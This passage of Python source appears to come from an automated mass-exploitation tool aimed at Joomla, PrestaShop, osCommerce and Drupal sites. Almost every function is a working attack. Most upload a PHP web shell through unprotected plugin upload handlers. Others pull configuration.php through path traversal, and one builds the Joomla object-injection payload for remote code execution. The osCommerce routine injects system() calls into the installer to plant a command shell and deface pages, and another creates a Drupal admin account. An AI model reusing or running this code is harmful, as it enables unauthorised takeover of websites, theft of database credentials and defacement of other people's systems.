	if 'class="inputbox" name="userfile"' in gas.text:
		post = requests.post(allurl, files=shell, timeout=50, headers=header)
		if 'has been successfully' or 'already exists' in post.text:
			checkshell = requests.get('http://' + url + '/administrator/components/com_alberghi/shell.php')
			if checkshell.status_code == 200:
				vuln('AlberghiExploit')
				hasilshell('http://' + url + '/administrator/components/com_alberghi/shell.php')
			else:
				gagal('AlberghiExploit')
		else:
			gagal('AlberghiExploit')
	else:
		gagal('AlberghiExploit')

def com_fabric(url):
	f = {'userfile': ('module/vuln.text', open('module/vuln.text', 'rb'), 'multipart/form-data')}
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	datane = {
                "name": "me.php",
                "drop_data": "1",
                "overwrite": "1",
                "field_delimiter": ",",
                "text_delimiter": "&quot;",
                "option": "com_fabrik",
                "controller": "import",
                "view": "import",
                "task": "doimport",
                "Itemid": "0",
                "tableid": "0"
            }

	allurl = 'http://' + url + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table="
	requests.post(allurl, files=f, data=datane, timeout=50, headers=headere)
	cek = requests.get('http://' + url + '/media/' + 'vuln.text'.split('/')[1], headers=header, timeout=50)
	if cek.status_code == 200:
		vuln('Com_Fabric')
		hasilshell('http://' + url + '/media/' + 'vuln.text')
	else:
		gagal('Com_Fabric')

def Com_Hdflvplayer(url):
	allurl = 'http://' + url + '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php'
	config = requests.get(allurl, timeout=5, headers=self.Headers)
	if 'JConfig' in config.text:
		vuln('Com_Hdflvplayer')
		getconfig('http://' + url + '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php')
	else:
		gagal('Com_Hdflvplayer')


def com_myblog(url):
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	shell = {'fileToUpload': open('module/shell.php', 'rb')}
	allurl = 'http://' + url + '/index.php?option=com_myblog&task=ajaxupload'
	gas = requests.post(allurl, files=shell, headers=header, timeout=50)
	if 'success' or 'File exists' in gas.text:
		if '/images/shell' in gas.text:
			indexpath = 'http://' + url + '/images/shell.php'
		else:
			try:
				getpath = re.findall("source: '(.*)'", gas.text)
				indexpath = getpath[0]
			except:
				indexpath = 'http://' + url + '/images/shell.php'
		checkindex = requests.get(indexpath, headers=header, timeout=50)
		if checkindex.status_code == 200:
			vuln('Com_Myblog')
			hasilshell('http://' + url + '/images/shell.php')
		else:
			gagal('Com_Myblog')
	else:
		gagal('Com_Myblog')

def com_macgallery(url):
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	allurl = 'http://' + url + '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php'
	gasdikek = requests.get(allurl, headers=header, timeout=50)
	if 'JConfig' in gasdikek.text:
		vuln('Com_MacGallery')
		getconfig(allurl)
	else:
		gas('Com_MacGallery')

def Com_CCkJseblod(url):
	kabeh = 'http://' + url + '/index.php?option=com_cckjseblod&task=download&file=configuration.php'
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	gas = requests.get(kabeh, headers=header, timeout=50)
	if 'JConfig' in gas.text:
		vuln('Com_cckJseblod')
		getconfig(kabeh)
	else:
		gagal('Com_cckJseblod')

def com_s5_media(url):
	allurl = 'http://' + url + '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	gas = requests.get(allurl, headers=header, timeout=50)
	if 'JGconfig' in gas.text:
		vuln('com_s5_media')
		getconfig(allurl)
	else:
		gagal('com_s5_media')


def Com_Jbcatalog(url):
	shell = {'files[]': open('module/shell.php', 'rb')}
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	checking = requests.get('http://' + url + '/components/com_jbcatalog/libraries/jsupload/server/php', headers=header, timeout=50)
	if checking.status_code == 200:
		requests.post('http://' + url + '/components/com_jbcatalog/libraries/jsupload/server/php', files=shell, headers=header, timeout=50)
		ndishell = requests.get('http://' + url + '/components/com_jbcatalog/libraries/jsupload/server/php/files/shell.php', headers=header, timeout=50)
		if 'mini' in ndishell.text:
			vuln('Com_Jbcatalog')
			hasilshell('Com_Jbcatalog')
		else:
			gagal('Com_Jbcatalog')
	else:
		gagal('Com_Jbcatalog')

def Com_SexyContactform(url):
	file = {'files[]': open('module/shell.php', 'rb')}
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	cek = requests.get('http://' + url + '/components/com_sexycontactform/fileupload/', headers=header, timeout=50)
	if cek.status_code == 200:
		requests.post('http://' + url + '/components/com_sexycontactform/fileupload/', files=file, headers=header, timeout=50)
		golek = requests.get('http://' + url + '/components/com_sexycontactform/fileupload/files/shell.php', headers=header, timeout=50)
		if golek.status_code == 200:
			vuln('Com_SexyContact')
			hasilshell('http://' + url + '/components/com_sexycontactform/fileupload/files/shell.php')
		else:
			gagal('Com_SexyContact')
	else:
		gagal('Com_SexyContact')

def Com_Rockdownload(url):
	shell = {'files[]': open('module/shell.php', 'rb')}
	cek = requests.get('http://' + url + '/administrator/components/com_rokdownloads/assets/uploadhandler.php')
	if cek.status_code == 200:
		header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
		dp = {'jpath': '../../../../'}
		requests.get('http://' + url + '/administrator/components/com_rokdownloads/assets/uploadhandler.php', files=shell, data=dp, headers=header, timeout=50)
		get = requests.get('http://' + url + '/images/stories/up.php', headers=header, timeout=50)
		if get.status_code == 200:
			vuln('Com_Rockdownload')
			hasilshell('http://' + url + '/images/stories/up.php')
		else:
			gagal('Com_Rockdownload')
	else:
		gagal('Com_Rockdownload')

def rce(url):
	ha = payloader("base64_decode('{}')".format('module/RCE.txt'))
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	headers = {'User-Agent': pl}
	try:
		cookies = requests.get('http://' + url, headers=headers, timeout=50).cookies
	except:
		cookies = []
	jajal = requests.get('http://' + url + '/', headers=headers, cookies=cookies, timeout=50)
	if jajal:
		cek1 = requests.get('http://' + url + '/images/vuln.php', timeout=5, headers=header)
		cek2 = requests.get('http://' + url + '/tmp/vuln.php', timeout=5, headers=header)
		cek3 = requests.get('http://' + url + '/vuln.php', timeout=5, headers=header)
		if 'Vuln!!' in cek1.text:
			vuln('RCE_Joomla')
			hasilshell('http://' + url + '/images/vuln.php')
		elif 'Vuln!!' in cek2.text:
			vuln('RCE_Joomla')
			hasilshell('http://' + url + '/tmp/vuln.php')
		elif 'Vuln!!' in cek3.text:
			vuln('RCE_Joomla')
			hasilshell('http://' + url + '/vuln.php')
		else:
			gagal('RCE_Joomla')
	else:
		gagal('RCE_Joomla')


def payloader(php_payload):
	try:
		php_payload = "eval({0})".format(php_payload)
		terminate = '\xf0\xfd\xfd\xfd';
		exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory"
		:0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"J
		DatabaseDriverMysql":0:{}s:8:"feed_url";'''
		injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
		exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
		exploit_template += r''';s:19:"cache_name_function";s:6:
		"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatab
		aseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connec
		tion";b:1;}''' + terminate
		return exploit_template
	except:
		pass

def drupalsqliadmin(url):
	os.system('python module/drupal.py -t http://' + url + ' -u pwndrupal -p pwndrupal')

def oscommerce(url):
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	cek = requests.get('http://' + url + '/install/index.php', timeout=50, headers=header)
	if 'Welcome to osCommerce' in cek.text or cek.status_code == 200:
		allurl = url + '/install/install.php?step=4'
		data = {
				'DIR_FS_DOCUMENT_ROOT': './'
				}
		payloadshell = "'Vuln!!<?php system($_GET['cmd']); ?>'"
		shell = '\');'
		shell += 'system("echo {} > vuln.php");'.format(payloadshell)
		shell += '/*'
		deface = '\');'
		deface += 'system("echo Vuln> ../../vuln.htm");'
		deface += '/*'
		data['DB_DATABASE'] = deface
		m = requests.post(url='http://' + allurl, data=data, timeout=50, headers=header)
		if m.status_code == 200:
			requests.get('http://' + url + '/install/includes/configure.php', timeout=5, headers=header)
			index = requests.get('http://' + url + '/vuln.htm', timeout=5, headers=header)
			if 'Vuln' in index.text:
				vuln('OsCommerce')
				hasilindex('http://' + url + '/vuln.htm')
				try:
					data['DB_DATABASE'] = shell
					requests.post(url='http://' + allurl, data=data, timeout=5, headers=self.Headers)
					requests.get('http://' + url + '/install/includes/configure.php', timeout=50, headers=header)
					requests.get('http://' + url + '/install/includes/OsComPayLoad.php', timeout=50, headers=header)
					Checkshell = requests.get('http://' + url + '/install/includes/vuln.php', timeout=5, headers=header)
					if 'Vuln' in Checkshell.text:
						hasilshell('http://' + url + '/install/includes/vuln.php')
				except:
					pass
			else:
				gagal('OsCommerce')
		else:
			gagal('OsCommerce')
	else:
		gagal('OsCommerce')

def lib(url):
	allurl = 'http://' + url + '/modules/lib/redactor/file_upload.php'
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
        try:
            vuln = requests.get('http://' + allurl, timeout=50, headers=header)
            if vuln.status_code == 200:
                FileDataIndex = {'file': open('module/shell.php', 'rb')}
                uploadedPathIndex = url + '/masseditproduct/uploads/file/shell.php' 
                requests.post('http://' + url, files=FileDataIndex, timeout=50, headers=header)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=50, headers=header)
                if 'shell' in CheckIndex.text:
                	vuln('Lib')
                	hasilshell('http://' + url + '/masseditproduct/uploads/file/shell.php' )
                else:
                    gagal('Lib')
            else:
                gagal('Lib')
        except:
            gagal('Lib')

def psmodthemeoptionpanel(url):
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	allurl = 'http://' + url + '/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php'
	try:
		Checkvuln = requests.get('http://' + allurl, timeout=50, headers=header)
		if Checkvuln.status_code == 200:
			FileDataIndex = {'image_upload': open('module/shell.php', 'rb')}
			uploadedPathIndex = url + '/modules/psmodthemeoptionpanel/upload/shell.php'
			requests.post('http://' + allurl, files=FileDataIndex, timeout=50, headers=header)
			CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=50, headers=header)
			if 'shell' in CheckIndex.text:
				vuln('PsmodThemeOption')
				hasilshell('http://' + url + '/modules/psmodthemeoptionpanel/upload/shell.php')
			else:
				gagal('PsmodThemeOption')
		else:
			gagal('PsmodThemeOption')
	except:
		gagal('PsmodThemeOption')

def megamenu(url):
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	allurl = url + '/modules/megamenu/uploadify/uploadify.php?id=pwn'
	check = requests.get('http://' + allurl, headers=header, timeout=50)
	shell = {'Filedata': open('module/shell.php', 'rb')}
	if check.status_code == 200:
		requests.post('http://' + url, files=shell, headers=header, timeout=50)
		shelle = requests.get('http://' + url + '/shell.php')
		if 'shell' in shelle.text:
			vuln('Megamenu')
			hasilshell('http://' + url + '/shell.php')
		else:
			gagal('Megamenu')
	else:
		gagal('Megamenu')

def nvn_export_orders(url):
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	allurl = url + '/modules/nvn_export_orders/upload.php'
	try:
		Checkvuln = requests.get('http://' + allurl, timeout=50, headers=header)
		if Checkvuln.status_code == 200:
			FileDataIndex = {'images[]': open('module/shell.php', 'rb')}
			uploadedPathIndex = url + '/modules/nvn_export_orders/shell.php'
			requests.post('http://' + allurl, files=FileDataIndex, timeout=5, headers=self.Headers)
			CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=self.Headers)
			if 'shell' in CheckIndex.text:
				vuln('Nvn_Export_Order')
				hasilshell('http://' + url + '/modules/nvn_export_orders/shell.php')
			else:
				gagal('Nvn_Export_Order')
		else:
			gagal('Nvn_Export_Order')
	except:
		gagal('Nvn_Export_Order')

def pkflexmenu(url):
	allurl = url + '/modules/pk_flexmenu/ajax/upload.php'
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	cek = requests.get('http://' + allurl, headers=header, timeout=50)
	if cek.status_code == 200:
		shell = {'images[]': open('module/shell.php', 'rb')}
		requests.post('http://' + allurl, files=shell, headers=header, timeout=50)
		ndi = requests.get('http://' + url + '/modules/pk_flexmenu/uploads/shell.php', headers=header, timeout=50)
		if 'shell' in ndi.text:
			vuln('Pk_Flexmenu')
			hasilshell('http://' + url + '/modules/pk_flexmenu/uploads/shell.php')
		else:
			gagal('Pk_Flexmenu')
	else:
		gagal('Pk_Flexmenu')

def wdoptionpanel(url):
	Exl = url + '/modules/wdoptionpanel/wdoptionpanel_ajax.php'
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	try:
		Checkvuln = requests.get('http://' + Exl, timeout=50, headers=header)
		if Checkvuln.status_code == 200:
			PostData = {'data': 'bajatax',
			'type': 'image_upload'}
			FileDataIndex = {'bajatax': open('module/shell.php', 'rb')}
			uploadedPathIndex = url + '/modules/wdoptionpanel/upload/shell.php'
			requests.post('http://' + Exl, files=FileDataIndex, data=PostData, timeout=50, headers=header)
			CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=50, headers=header)
			if 'shell' in CheckIndex.text:
				vuln('Wd_OptionPanel')
				hasilshell('http://' + url + '/modules/wdoptionpanel/upload/shell.php')
			else:
				gagal('Wd_OptionPanel')
		else:
			gagal('Wd_OptionPanel')
	except:
		gagal('Wd_OptionPanel')

def fieldvmegamenu(url):
	Exl = url + '/modules/fieldvmegamenu/ajax/upload.php'
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	try:
		Checkvuln = requests.get('http://' + Exl, timeout=5, headers=header)
		if Checkvuln.status_code == 200:
			FileDataIndex = {'images[]': open('module/shell.php', 'rb')}
			uploadedPathIndex = url + '/modules/fieldvmegamenu/uploads/shell.php'
			requests.post('http://' + Exl, files=FileDataIndex, timeout=5, headers=header)
			CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=header)
			if 'shell' in CheckIndex.text:
				vuln('Field_Megamenu')
				hasilshell('http://' + url + '/modules/fieldvmegamenu/uploads/shell.php')
			else:
				gagal('Field_Megamenu')
		else:
			gagal('Field_Megamenu')
	except:
		gagal('Field_Megamenu')

def wg24themeadministration(url):
	Exl = url + '/modules/wg24themeadministration/wg24_ajax.php'
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	try:
		Checkvuln = requests.get('http://' + Exl, timeout=50, headers=header)
		if Checkvuln.status_code == 200:
			PostData = {'data': 'bajatax',
			'type': 'pattern_upload'}
			FileDataIndex = {'bajatax': open('module/shell.php', 'rb')}
			uploadedPathIndex = url + '/modules/wg24themeadministration/img/upload/shell.php'
			requests.post('http://' + Exl, files=FileDataIndex, data=PostData, timeout=50, headers=header)
			CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=50, headers=header)
			if 'shell' in CheckIndex.text:
				vuln('WgTheme_Administration')
				hasilshell('http://' + url + '/modules/wg24themeadministration/img/upload/shell.php')
			else:
				gagal('WgTheme_Administration')
		else:
			gagal('WgTheme_Administration')
	except:
		gagal('WgTheme_Administration')

def videostab(url):
	try:
		Exp = url + '/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload'
		header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
		Checkvuln = requests.get('http://' + Exp, timeout=50, headers=header)
		FileDataIndex = {'qqfile': open('module/shell.php', 'rb')}
		if Checkvuln.status_code == 200:
			requests.post('http://' + Exp, files=FileDataIndex, timeout=50, headers=header)
			IndexPath = url + '/modules/videostab/uploads/shell.php'
			CheckIndex = requests.get('http://' + IndexPath, timeout=50, headers=header)
			if 'shell' in CheckIndex.text:
				vuln('Videostab')
				hasilshell('http://' + url + '/modules/videostab/uploads/shell.php')
			else:
				gagal('Videostab')
		else:
			gagal('Videostab')
	except:
		gagal('Videostab')

def cartabandonmentpro(url):
	try:
		Exp = url + '/modules/cartabandonmentpro/upload.php'
		header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
		Checkvuln = requests.get('http://' + Exp, timeout=50, headers=header)
		FileDataIndex = {'image': open('modules/shell.php', 'rb')}
		if Checkvuln.status_code == 200:
			requests.post('http://' + Exp, files=FileDataIndex, timeout=50, headers=header)
			IndexPath = url + '/modules/cartabandonmentpro/uploads/shell.php'
			CheckIndex = requests.get('http://' + IndexPath, timeout=50, headers=header)
			if 'shell' in CheckIndex.text:
				vuln('CartabandonmentPro')
				hasilshell('http://' + url + '/modules/cartabandonmentpro/uploads/shell.php')
			else:
				gagal('CartabandonmentPro')
		else:
			gagal('CartabandonmentPro')
	except:
		gagal('CartabandonmentPro')

def cartabandonmentproOld(url):
	try:
		Exp = url + '/modules/cartabandonmentproOld/upload.php'
		header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
		Checkvuln = requests.get('http://' + Exp, timeout=50, headers=header)
		FileDataIndex = {'image': open('module/shell.php', 'rb')}
		if Checkvuln.status_code == 200:
			requests.post('http://' + Exp, files=FileDataIndex, timeout=50, headers=header)
			IndexPath = url + '/modules/cartabandonmentproOld/uploads/shell.php'
			CheckIndex = requests.get('http://' + IndexPath, timeout=50, headers=header)
			if 'shell' in CheckIndex.text:
				vuln('CartabandonmentPro01d')
				hasilshell('http://' + url + '/modules/cartabandonmentproOld/uploads/shell.php')
			else:
				gagal('CartabandonmentPro01d')
		else:
			gagal('CartabandonmentPro01d')
	except:
		gagal('CartabandonmentPro01d')

def columnadverts(url):
	try:
		Exp = url + '/modules/columnadverts/uploadimage.php'
		header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
		FileDataIndex = {'userfile': open('module/shell.php', 'rb')}
		GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=50, headers=header)
		if 'success' in GoT.text:
			IndexPath = '/modules/columnadverts/slides/shell.php'
			CheckIndex = requests.get('http://' + url + IndexPath, timeout=50, headers=header)
			if 'shell' in CheckIndex.text:
				vuln('ColumnAdvertise')
				hasilshell('http://' + url + '/modules/columnadverts/slides/shell.php')
			else:
				gagal('ColumnAdvertise')
		else:
			gagal('ColumnAdvertise')
	except:
		gagal('ColumnAdvertise')
		
def Com_facileforms(url):
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	cek = requests.get('http://' + url + '/components/com_facileforms/libraries/jquery/uploadify.php', headers=header, timeout=50)
	if cek.status_code == 200:
		shell = {'Filedata': open('module/shell.php', 'rb')}
		datas = {'folder': '/components/com_facileforms/libraries/jquery/'}
		requests.post('http://' + url + '/components/com_facileforms/libraries/jquery/uploadify.php', files=shell, data=datas, headers=header, timeout=50)
		cekneh = requests.get('http://' + url + '/components/com_facileforms/libraries/jquery/shell.php', headers=header, timeout=50)
		if 'shell' in cekneh.txt:
			vuln('Com_Facileform')
			hasilshell('http://' + url + '/components/com_facileforms/libraries/jquery/shell.php')
		else:
			gagal('Com_Facileform')
	else:
		gagal('Com_Facileform')

banner()